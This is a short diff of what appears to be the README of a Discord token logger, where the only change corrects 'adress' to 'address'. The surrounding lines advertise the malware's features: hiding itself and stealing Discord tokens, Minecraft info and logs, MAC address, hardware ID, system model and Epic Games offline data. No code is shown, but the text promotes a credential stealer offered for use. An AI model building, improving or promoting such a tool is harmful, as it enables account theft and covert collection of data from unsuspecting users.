@@ -15,7 +15,7 @@ The best discord token logger!
 - Self hide  
 - Kinda clean embed  
 - Steal minecraft info and logs  
-- Steal mac adress
+- Steal mac address
 - Steal system hwid
 - Steal system model
 - Epic games offline data
